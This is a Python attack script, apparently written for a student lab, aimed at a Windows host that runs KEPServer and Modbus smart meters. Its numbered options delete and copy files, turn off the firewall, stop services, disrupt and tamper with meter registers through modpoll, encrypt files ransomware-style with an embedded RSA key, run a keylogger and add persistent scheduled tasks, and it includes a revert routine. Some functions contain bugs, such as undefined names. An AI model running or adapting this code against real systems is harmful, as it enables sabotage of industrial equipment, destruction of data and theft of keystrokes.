from os import walk, path, remove, system, getcwd, mkdir, scandir, urandom, kill, rmdir
from psutil import process_iter
import signal
import base64
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from shutil import copyfile
from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
from ctypes import windll
from sys import executable, argv
from win32netcon import ACCESS_ALL
from win32net import NetShareAdd
from time import sleep


copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"

#Check if administrator
def check_admin():
    try:
        isAdmin = windll.shell32.IsUserAnAdmin()
    except AttributeError:
        isAdmin = False
    if not isAdmin:
        windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)

#Delete file in specific folder
def delete_files(folder_path):
    for root, dirs, files in walk(folder_path):
        for file in files:
            og = path.join(root, file)
            dest = path.join(copiedpath, file)
            remove(og)
            print("File: " + str(og) + " is deleted")

def copy_file(folder_path):
    for root, dirs, files in walk(folder_path):
        for file in files:
            og = path.join(root, file)
            dest = path.join(copiedpath, file)
            copyfile(og,dest)
            print("File: " + str(og) + " is copied")

    

#Disable firewall
def disable_firewall():
    cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Firewall disabled successfully\nOk.")
    else:
        print("Firewall failed to disable\nFail.")

#Disable ssh from firewall
def disable_ssh():
    count = 0
    cp = run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        count += 1
        print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
    else:
        print("Inbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        count += 1
        print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
    else:
        print("Inbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        count += 1
        print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
    else:
        print("Outbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        count += 1
        print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
    else:
        print("Outbound Firewall Failed to be Inserted")

    if count == 4:
        print("Firewall Rules added successfully.\nOk.")
    else:
        print("Firewall Rules failed to add.\nFail.")
        
#Disable Kepserver Service
def disable_kepserver():
    service_name = "KEPServerEXV6"
    cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
    output = cp.stdout.decode('utf-8').strip().split()
    if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]) + "\nFail.")
    else:
        print("The " + output[1] + " service is " + output[9] + "\nOk.")

#Run modpoll to interrupt COM1 port
def run_modinterrupt():
    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
    if "RUNNING" in netshare.stdout:
        print("Kepserver is running, Stopping now.")
        service_name = "KEPServerEXV6"
        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]) + "\nFail.")
        else:
            print("The " + output[1] + " service is " + output[9])


    sleep(5)

    current_directory = getcwd()
    executable_path = current_directory + "\\modpoll.exe"

    checkmodpoll = run(['modpoll.exe', "-1", "-b", '9600', '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1'], stdout=PIPE, stderr=PIPE, text=True)

    sleep(5)
    if "Polling" in checkmodpoll.stdout:
        print("Modinterrupt is running \nOk.\n")
        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
        try:
            run(['modpoll.exe', "-b", '9600', '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1'], stdout=PIPE, stderr=PIPE, text=True)
        except CalledProcessError as e:
            print("Error executing the executable file:", e)
    else:
        print("Modinterrupt is not running. \n Fail.\n")


#Disable COM Port
def disable_COMPort():
    cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
    dump = cp.stdout.split()
    deviceID = ""
    comPort = ""
    deviceArr = []
    for i in range(0, len(dump)):
        if dump[i].decode("utf-8") == "ID:":
            deviceID = dump[i+1].decode("utf-8")
            if "CVBCx196117" in deviceID:
                comPort = deviceID
    batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/disable-device\" \"" + comPort + "\""
    with open("script.bat", "w") as f:
        f.write(batchscript)
    cp = run(["script.bat"],stdout=PIPE ,shell=True)
    if "successfully" in cp.stdout.decode('utf-8'):
        print(cp.stdout.decode('utf-8') + "\nOk.")
    else:
        print("Device not disabled. \nFail.")

    remove("script.bat")
    

#Create Shared Folder
def Create_Share_folder():
    folder_path = r'C:\Windows\temp\Smartmeter'

    # Create the folder if it does not already exist
    if not path.exists(folder_path):
        mkdir(folder_path)

    netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
    if "SmartMeterfolder" in netshare.stdout:
        print ("SmartMeterfolder has already been shared.")
    else:
        # Set the share information
        share_name = 'SmartMeterfolder'
        share_path = folder_path
        share_remark = 'Shared folder for full access'

        # Create the share
        share_info = {
            'netname': share_name,
            'path': share_path,
            'remark': share_remark,
            'max_uses': -1,
            'current_uses': 0,
            'permissions': ACCESS_ALL,
            'security_descriptor': None
        }
        NetShareAdd(None, 2, share_info)
        print ("SmartMeterfolder has been shared.")

def encrypt_Files():
    #public key
    pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxTm9UT1pTRkI5SjEwVWF3bUNGRgpTWERLeE1tUFRQTDFKQmVyQ2xGbkI0MDJNblBtSVc1WXp6SXo4S29Rc2JzTXhQK3B4SSt4TzJmM283dW1RU0YwCitKdnRFNlRLc2RXN3JCTzJFNzVFekZzUXR0QmdyZEthOXJOL2ZVV3dwUXNFdFBwL1Jnay9XNENRcWZzUFZLQXAKTnFQWE43SllHNjJ0L1Y1Wk8zSTFRYmpHSUJ4UFF1U2ZrODhIa3l5NkdYWE1UOHRaT2pHUHNMUy9wTVkwaVEvUwp6RUh2M2RRYzJXZ2dJY3FBbUFKT0VWS2pyTFBHYlUvdHIzNWw4MDVIbHdoa3RmUXVsQStBR3JLT2JYdDdPK1cvCkxPU21Ib2VnSXJOaHZtRGsvUFRtRGFtYzdhTUIwaTZhZGIrRzFEMU5Sc0RXZEwyS3Rkb0lnMGVGQk9oQ0JtQUQKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
    pubKey = base64.b64decode(pubKey)

    #exclude extensions
    excludeExtension = ['.py','.pem', '.exe']
    try:
        for item in recurseFiles(smartmeterpath): 
            filePath = Path(item)
            fileType = filePath.suffix.lower()

            if fileType in excludeExtension:
                continue
            encrypt(filePath, pubKey)
            print("Encrypted: " + str(filePath))

        print("Encryption Successful.\nOk.")
    except Exception as e:
        print("Encryption Failed.\nFail.")

def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName= dataFile.split(extension)[0]
    fileExtension = '.encrypted'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    remove(dataFile)


def recurseFiles(baseDirectory):
    #Scan a directory and return a list of all files
    for entry in scandir(baseDirectory):
        if entry.is_file():
            yield entry
        else:
            yield from recurseFiles(entry.path)

def decrypt(dataFile, privatekey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''

    key = RSA.import_key(privatekey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]
    try:
        # decrypt the session key
        cipher = PKCS1_OAEP.new(key)
        sessionKey = cipher.decrypt(encryptedSessionKey)

        # decrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)

        # save the decrypted data to file
        [ fileName, fileExtension ] = str(dataFile).split('.')
        decryptedFile = fileName + '_decrypted.csv'
        with open(decryptedFile, 'wb') as f:
            f.write(data)

        print('Decrypted file saved to ' + decryptedFile)
    except Exception as e:
        print("File have not been encrypted.")

#Run modpoll to change register 40201 to 26
def changeMeterID():
    current_directory = getcwd()
    executable_path = current_directory + "\\modpoll.exe"
    
    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
    if "RUNNING" in netshare.stdout:
        service_name = "KEPServerEXV6"
        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)

    parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]
    try:
        check_call([executable_path] + parameters)
        print("\nOk.")
    except CalledProcessError as e:
        print("Error executing the executable file:", e)
        print("Fail.")

def clearEnergyReading():
    current_directory = getcwd()
    executable_path = current_directory + "\\modpoll.exe"
    checkEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
    clearEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
    try:
        check_call([executable_path] + checkEnergy)
        check_call([executable_path] + clearEnergy)
        check_call([executable_path] + checkEnergy)
        print("Energy Reading Cleared.\nOk.")
    except CalledProcessError as e:
        print("Error executing the executable file:", e)
        print("Fail.")

def runKeylogger():
    current_directory = getcwd()
    executable_path = current_directory + "\\Keylogger.exe"
    print("Keylogger running successfully.\nOk.")
    check_call([executable_path])

def create_scheduled_task():
    executable_file_path = r'C:\\Windows\\temp\\Smartmeter\\AttackScript.exe' #Help me change this

    executable_file_parameters = '1'

    task_name = 'Smart Meter Testing'
    task_name2 = 'Smart Meter Testing 2'
    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 5'
    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon'

    # Create the task using the schtasks command
    subprocess.call(sch1, shell=True)
    subprocess.call(sch2, shell=True)

def revert(revertoption):
    # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
    if revertoption == "1":
        cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
        if cp.stdout.decode('utf-8').strip() == "Ok.":
            print("Firewall enabled successfully.\nOk.")
        else:
            print("Firewall failed to enable.\nFail.")
        
    elif revertoption == "2":
        count = 0
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Inbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Inbound Firewall Not Removed (UDP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Outbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Outbound Firewall Not Removed (UDP/22)")

        if count == 4:
            print("Revert Success.\nOk.")
        else:
            print("Revert Fail.\nFail.")
        
    elif revertoption == "3":
        service_name = "KEPServerEXV6"
        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]) + "\nFail.")
        else:
            print("The " + output[1] + " service is " + output[9] + "\nOk.")
        
    elif revertoption == "4":
        cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
        dump = cp.stdout.split()
        deviceID = ""
        deviceArr = []
        for i in range(0, len(dump)):
            if dump[i].decode("utf-8") == "ID:":
                deviceID = dump[i+1].decode("utf-8")
                if "CVBCx196117" in deviceID:
                    comPort = deviceID
        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
        with open("script.bat", "w") as f:
            f.write(batchscript)
        cp = run(["script.bat"],stdout=PIPE ,shell=True)
        if "successfully" in cp.stdout.decode('utf-8'):
            print(cp.stdout.decode('utf-8') + "\nOk.")
        else:
            print("Device not enabled. \nFail.")
        remove("script.bat")

    elif revertoption == "5":
        privatekey = '''-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
-----END RSA PRIVATE KEY-----'''
        
        try:
            for item in recurseFiles(smartmeterpath): 
                filePath = Path(item)
                fileType = filePath.suffix.lower()

                if fileType in excludeExtension:
                    continue
                decrypt(filePath, privatekey)
            print("Decryption Successful.\nOk.")
        except Exception as e:
            print("Decryption Failed.\nFail.")

    elif revertoption == "6":
        current_directory = getcwd()
        executable_path = current_directory + "\\modpoll.exe"
        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
        try:
            check_call([executable_path] + parameters)
            print("\nOk.")
        except CalledProcessError as e:
            print("Error executing the executable file:", e)
            print("Fail.")
    elif revertoption == "7":
        process_name = "modpoll"
        pid = 0

        for proc in process_iter():
            if process_name in proc.name():
               pid = proc.pid
               break
        if pid == 0:
            print("Modpoll not running.\nFail.")
        else:
            kill(pid, signal.SIGTERM)
            print("Modpoll pid:", pid, "has stopped. \nOk.")

    elif revertoption == "8":
        for root, dirs, files in walk(copiedpath):
            for file in files:
                og = path.join(root, file)
                remove(og)
                print("File: " + str(og) + " is deleted")
        rmdir(copiedpath)
        system('cmd /k "net share SmartMeterfolder /delete"')

        netshare = run(['schtasks', '/query'], stdout=PIPE, stderr=PIPE, text=True)
        if "Smart Meter Testing" in netshare.stdout:
            task_name = 'Smart Meter Testing'
            task_name2 = 'Smart Meter Testing 2'

            # Define the command to delete the task using schtasks
            schdel = f'schtasks /delete /tn "{task_name}" /f'
            schdel2 = f'schtasks /delete /tn "{task_name}" /f'

            # Delete the task using the schtasks command
            subprocess.call(schdel, shell=True)
            subprocess.call(schdel2, shell=True)

        print("Ok.")


    elif revertoption == "9":
        process_name = "keylogger"
        pid = 0

        for proc in process_iter():
            if process_name in proc.name():
               pid = proc.pid
               break
        if pid == 0:
            print("Keylogger not running.\nFail.")
        else:
            kill(pid, signal.SIGTERM)
            print("Keylogger pid:", pid, "has stopped.\nOk.")
    elif revertoption == "10":
        cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
        if cp.stdout.decode('utf-8').strip() == "Ok.":
            print("Revert Firewall diasble successfull.")
        else:
            print("Revert Firewall diasble failed.")
        
        print("\n==================================\n")
        count = 0
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Inbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Inbound Firewall Not Removed (UDP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Outbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Outbound Firewall Not Removed (UDP/22)")

        if count == 4:
            print("Revert Firewall Rules Success.")
        else:
            print("Revert Firewall Rules Fail.")

        print("\n==================================\n")
            
        service_name = "KEPServerEXV6"
        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]))
        else:
            print("The " + output[1] + " service is " + output[9])

        print("\n==================================\n")
            
        cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
        dump = cp.stdout.split()
        deviceID = ""
        deviceArr = []
        for i in range(0, len(dump)):
            if dump[i].decode("utf-8") == "ID:":
                deviceID = dump[i+1].decode("utf-8")
                if "CVBCx196117" in deviceID:
                    comPort = deviceID
        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
        with open("script.bat", "w") as f:
            f.write(batchscript)
        cp = run(["script.bat"],stdout=PIPE ,shell=True)
        print(cp.stdout.decode('utf-8'))
        remove("script.bat")

        print("\n==================================\n")

        privatekey = '''-----BEGIN RSA PRIVATE KEY-----
    MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
    IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
    rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
    QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
    bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
    0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
    vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
    BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
    K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
    eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
    wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
    pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
    2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
    J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
    hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
    67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
    2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
    uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
    dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
    fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
    bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
    MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
    YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
    QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
    zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
    -----END RSA PRIVATE KEY-----'''
        
        excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
        try:
            for item in recurseFiles(smartmeterpath): 
                filePath = Path(item)
                fileType = filePath.suffix.lower()

                if fileType in excludeExtension:
                    continue
                decrypt(filePath, privatekey)
            print("Decryption Successful")
        except Exception as e:
            print("Decryption Failed")

        print("\n==================================\n")


        current_directory = getcwd()
        executable_path = current_directory + "\\modpoll.exe"
        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
        try:
            check_call([executable_path] + parameters)
        except CalledProcessError as e:
            print("Error executing the executable file:", e)

        print("\n==================================\n")

        process_name = "modpoll"
        pid = 0

        for proc in process_iter():
            if process_name in proc.name():
               pid = proc.pid
               break
        if pid == 0:
            print("Modpoll not running.")
        else:
            kill(pid, signal.SIGTERM)
            print("Modpoll pid:", pid, "has stopped.")

        print("\n==================================\n")
            
        for root, dirs, files in walk(copiedpath):
            for file in files:
                og = path.join(root, file)
                remove(og)
                print("File: " + str(og) + " is deleted")
        rmdir(copiedpath)
        print("Directory: " + str(copiedpath) + " is deleted")
        system('cmd /k "net share SmartMeterfolder /delete"')

        print("\n==================================\n")


        process_name = "keylogger"
        pid = 0

        for proc in process_iter():
            if process_name in proc.name():
               pid = proc.pid
               break
        if pid == 0:
            print("Keylogger not running.")
        else:
            kill(pid, signal.SIGTERM)
            print("Keylogger pid:", pid, "has stopped.")

        print("\n==================================\n")

        print("Reverting everything successfull.\nOk.")

    elif revertoption == "-h":
        print("\n Choose: \n1 to enable firewall, \n2 to re-enable ssh through firewall, \n3 re-enable kepserver service, \n4 re-enable COM port, \n5 decrypt encrypted files, \n6 change meter25 id back, \n7 Kill Modpoll, \n8 remove shared folder and scheduled task, \n9 Kill Keylogger, \n10 Revert Everything.")
    else:
        print ("Invalid Option! Use option \"-h\" for help!")

if __name__ == '__main__':
    check_admin()
    attackoption = str(argv[1])
    if attackoption == "1":
        create_scheduled_task()
        delete_files(smartmeterpath)
        print("\nOk.")
    elif attackoption == "2":
        Create_Share_folder()
        copy_file(smartmeterpath)
        print("\nOk.")
    elif attackoption == "3":
        disable_firewall()
    elif attackoption == "4":
        disable_ssh()
    elif attackoption == "5":
        disable_kepserver()
    elif attackoption == "6":
        run_modinterrupt()
    elif attackoption == "7":
        disable_COMPort()
    elif attackoption == "8":
        encrypt_Files()
    elif attackoption == "9":
        changeMeterID()
    elif attackoption == "10":
        clearEnergyReading()
    elif attackoption == "11":
        revertoption = str(argv[2])
        revert(revertoption)
    elif attackoption == "12":
        runKeylogger()
    elif attackoption == "-h":
        print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrupt modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to clearEnergyReading, \n11 to revert with options, \n12 run Keylogger.")

    else:
        print ("Invalid Option! Use option \"-h\" for help!")
